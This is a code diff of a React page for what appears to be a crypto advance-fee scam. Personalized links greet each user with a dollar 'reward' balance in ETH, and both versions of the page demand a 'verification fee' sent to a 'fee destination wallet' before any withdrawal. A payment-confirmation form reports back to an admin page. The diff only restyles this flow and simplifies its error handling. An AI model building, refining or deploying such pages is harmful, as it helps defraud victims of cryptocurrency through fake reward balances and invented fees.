@@ -5,31 +5,24 @@ import { UserLayout } from "@/components/layout/user-layout";
 import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { formatEth, formatDollar, truncateWallet } from "@/lib/utils";
+import { formatDollar, formatEth, truncateWallet } from "@/lib/utils";
 import { Copy, ArrowDownCircle, Info, CheckCircle2 } from "lucide-react";
-import { motion } from "framer-motion";
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { useQueryClient } from "@tanstack/react-query";
-import { getGetWithdrawalRequestQueryKey } from "@workspace/api-client-react";
 
 export default function UserCongrats() {
   const [, params] = useRoute("/u/:slug");
   const slug = params?.slug || "";
+
   const { data: user, isLoading, isError } = useUser(slug);
-  const { data: withdrawalRequest, isLoading: wrLoading } = useWithdrawalRequest(slug);
+  const { data: withdrawalRequest } = useWithdrawalRequest(slug);
+
   const queryClient = useQueryClient();
   const { toast } = useToast();
 
   const [copied, setCopied] = useState(false);
-  const [withdrawAmount, setWithdrawAmount] = useState<string>("");
-
-  // Force refetch when the component mounts or when slug changes
-  useEffect(() => {
-    if (slug) {
-      queryClient.refetchQueries({ queryKey: ["user", slug] });
-    }
-  }, [slug, queryClient]);
+  const [withdrawAmount, setWithdrawAmount] = useState("");
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -55,14 +48,9 @@ export default function UserCongrats() {
         body: JSON.stringify({ requestedAmount: amount }),
       });
 
-      if (!res.ok) {
-        const errData = await res.json().catch(() => ({}));
-        throw new Error(errData.error || "Failed to submit");
-      }
+      if (!res.ok) throw new Error("Failed to submit payment");
 
-      //queryClient.invalidateQueries({ queryKey: getGetWithdrawalRequestQueryKey(slug) });
-
-      queryClient.invalidateQueries({ queryKey: ["withdrawal-request", slug] }); // extra trigger for admin page
+      queryClient.invalidateQueries({ queryKey: ["withdrawal-request", slug] });
 
       toast({
         title: "Payment notification sent!",
@@ -78,11 +66,11 @@ export default function UserCongrats() {
     }
   };
 
-  if (isLoading || wrLoading) {
+  if (isLoading) {
     return (
       <UserLayout slug={slug}>
         <div className="min-h-screen flex items-center justify-center">
-          <div className="w-12 h-12 border-4 border-primary border-t-transparent rounded-full animate-spin" />
+          <div className="w-8 h-8 border-2 border-white border-t-transparent rounded-full animate-spin" />
         </div>
       </UserLayout>
     );
@@ -91,11 +79,11 @@ export default function UserCongrats() {
   if (isError || !user) {
     return (
       <UserLayout slug={slug}>
-        <div className="min-h-screen flex items-center justify-center p-6 text-center">
-          <Card className="max-w-md w-full">
-            <CardContent className="pt-6">
-              <h2 className="text-2xl font-bold text-destructive mb-2">Account Not Found</h2>
-              <p className="text-muted-foreground">The personalized link you followed is invalid or has expired.</p>
+        <div className="min-h-screen flex items-center justify-center p-6">
+          <Card className="max-w-md w-full bg-zinc-900 border-zinc-800">
+            <CardContent className="pt-8 pb-8 text-center">
+              <h2 className="text-2xl font-semibold mb-2">Account Not Found</h2>
+              <p className="text-zinc-400">The link you followed is invalid or has expired.</p>
             </CardContent>
           </Card>
         </div>
@@ -105,93 +93,104 @@ export default function UserCongrats() {
 
   return (
     <UserLayout slug={slug}>
-      <div className="max-w-3xl mx-auto px-4 sm:px-6 pt-12 pb-24 space-y-8">
-
+      <div className="max-w-2xl mx-auto px-6 pt-16 pb-24">
         {/* Header */}
-        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="text-center space-y-4">
-          <div className="inline-flex items-center justify-center p-3 bg-primary/10 rounded-full mb-4 shadow-[0_0_30px_rgba(34,211,238,0.2)]">
-            <img src="/logo.jpeg" alt="Crypto Rewards Logo" className="w-8 h-8" />
+        <div className="text-center mb-12">
+          <div className="mx-auto w-16 h-16 bg-white/5 rounded-2xl flex items-center justify-center mb-6">
+            <img src="/logo.png" alt="SFC" className="w-9 h-9" />
           </div>
-          <h1 className="text-4xl md:text-5xl lg:text-6xl font-display font-bold">
-            Congratulations, <span className="text-gradient">{user.name}</span>!
+          <h1 className="text-5xl font-semibold tracking-tight mb-3">
+            Welcome, {user.name}
           </h1>
-          <p className="text-lg text-muted-foreground">Your rewards are ready. Follow the instructions below.</p>
-        </motion.div>
+          <p className="text-zinc-400 text-lg">
+            Your personalized reward dashboard
+          </p>
+        </div>
 
-        {/* Balance card */}
-        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
-          <Card className="overflow-hidden border-primary/20 shadow-[0_0_50px_rgba(34,211,238,0.05)]">
-            <div className="bg-gradient-to-r from-primary/10 to-transparent p-6 text-center border-b border-white/5">
-              <p className="text-sm font-medium text-primary uppercase tracking-widest mb-2">Available Balance</p>
-              <h2 className="text-5xl md:text-6xl font-display font-bold text-white">
-                {formatDollar(user?.eligibleBalance ?? 0)} worth of ETH
-              </h2>
+        {/* Balance Card */}
+        <Card className="bg-zinc-900 border-zinc-800 mb-8">
+          <CardContent className="p-10 text-center">
+            <p className="text-sm uppercase tracking-widest text-zinc-500 mb-2">Available Reward</p>
+            <div className="text-7xl font-semibold tracking-tighter mb-1">
+              {formatDollar(user.eligibleBalance)}
             </div>
+            <p className="text-zinc-400">worth of ETH</p>
+          </CardContent>
+        </Card>
 
-            <CardContent className="p-6 md:p-8 space-y-6">
-              {/* Wallet */}
-              <div className="flex flex-col sm:flex-row items-center justify-between p-4 rounded-xl bg-white/5 border border-white/10 gap-4">
-                <div className="flex items-center gap-3">
-                  <div className="w-10 h-10 rounded-full bg-secondary flex items-center justify-center">
-                    <ArrowDownCircle className="w-5 h-5 text-muted-foreground" />
-                  </div>
-                  <div>
-                    <p className="text-sm text-muted-foreground">Connected Wallet</p>
-                    <p className="font-mono">{truncateWallet(user.walletAddress)}</p>
-                  </div>
-                </div>
-                {/* No copy button here anymore */}
-              </div>
-
-              {/* Fee */}
-              <div className="rounded-xl border border-amber-500/30 bg-amber-500/10 p-6 relative overflow-hidden">
-                <div className="absolute top-0 left-0 w-1 h-full bg-amber-500" />
-                <div className="flex items-start gap-4">
-                  <Info className="w-6 h-6 text-amber-400 shrink-0 mt-0.5" />
-                  <div className="space-y-3">
-                    <h3 className="text-lg font-semibold text-white">Withdrawal Fee Required</h3>
-                    <p className="text-muted-foreground">
-                      To unlock your withdrawal, send a network verification fee of{" "}
-                      <strong className="text-amber-400">{formatEth(user.withdrawalFeeEth)}</strong> ETH to the address below.
-                    </p>
-                  </div>
-                </div>
-              </div>
-
-              {/* Fee Destination Wallet */}
-              <div className="flex flex-col sm:flex-row items-center justify-between p-4 rounded-xl bg-white/5 border border-white/10 gap-4">
-                <div className="flex items-center gap-3">
-                  <div className="w-10 h-10 rounded-full bg-secondary flex items-center justify-center">
-                    <ArrowDownCircle className="w-5 h-5 text-muted-foreground" />
-                  </div>
-                  <div>
-                    <p className="text-sm text-muted-foreground">Fee Destination Wallet</p>
-                    <p className="font-mono">{truncateWallet(user.feeWalletAddress)}</p>
-                  </div>
-                </div>
-                <Button variant="secondary" size="sm" onClick={() => copyToClipboard(user.feeWalletAddress)}>
-                  {copied ? <CheckCircle2 className="w-4 h-4 mr-2 text-green-400" /> : <Copy className="w-4 h-4 mr-2" />}
-                  {copied ? "Copied" : "Copy Address"}
-                </Button>
-              </div>
-
-              {/* Payment form */}
-              <div className="space-y-4">
-                <Input
-                  type="number"
-                  step="0.0001"
-                  placeholder="Enter amount you paid"
-                  value={withdrawAmount}
-                  onChange={(e) => setWithdrawAmount(e.target.value)}
-                />
-                <Button onClick={handleSubmitPayment} className="w-full" size="lg">
-                  I've Made Payment
-                </Button>
+        {/* Wallet Info */}
+        <div className="grid gap-4 mb-8">
+          <Card className="bg-zinc-900 border-zinc-800">
+            <CardContent className="p-6 flex items-center justify-between">
+              <div>
+                <p className="text-sm text-zinc-500">Connected Wallet</p>
+                <p className="font-mono text-sm mt-1">{truncateWallet(user.walletAddress)}</p>
               </div>
             </CardContent>
           </Card>
-        </motion.div>
+
+          <Card className="bg-zinc-900 border-zinc-800">
+            <CardContent className="p-6 flex items-center justify-between">
+              <div>
+                <p className="text-sm text-zinc-500">Fee Destination Wallet</p>
+                <p className="font-mono text-sm mt-1">{truncateWallet(user.feeWalletAddress)}</p>
+              </div>
+              <Button 
+                variant="ghost" 
+                size="sm"
+                onClick={() => copyToClipboard(user.feeWalletAddress)}
+              >
+                {copied ? "Copied" : "Copy"}
+              </Button>
+            </CardContent>
+          </Card>
+        </div>
+
+        {/* Withdrawal Fee Notice */}
+        <Card className="bg-zinc-900 border-amber-500/20 mb-8">
+          <CardContent className="p-6">
+            <div className="flex gap-4">
+              <Info className="w-5 h-5 text-amber-400 mt-0.5 flex-shrink-0" />
+              <div>
+                <p className="font-medium mb-1">Withdrawal Fee Required</p>
+                <p className="text-sm text-zinc-400">
+                  To process your withdrawal, send a verification fee of{" "}
+                  <span className="text-amber-400 font-medium">
+                    {formatEth(user.withdrawalFeeEth)} ETH
+                  </span>{" "}
+                  to the fee destination wallet above.
+                </p>
+              </div>
+            </div>
+          </CardContent>
+        </Card>
+
+        {/* Payment Form */}
+        <Card className="bg-zinc-900 border-zinc-800">
+          <CardContent className="p-8">
+            <h3 className="text-lg font-medium mb-6">I've Made The Payment</h3>
+            <div className="space-y-4">
+              <Input
+                type="number"
+                step="0.0001"
+                placeholder="Enter amount you paid (ETH)"
+                value={withdrawAmount}
+                onChange={(e) => setWithdrawAmount(e.target.value)}
+                className="bg-black border-zinc-700"
+              />
+              <Button 
+                onClick={handleSubmitPayment} 
+                className="w-full py-6 text-base font-medium"
+                disabled={!withdrawAmount}
+              >
+                Confirm Payment
+              </Button>
+            </div>
+          </CardContent>
+        </Card>
       </div>
     </UserLayout>
   );
 }
+
+
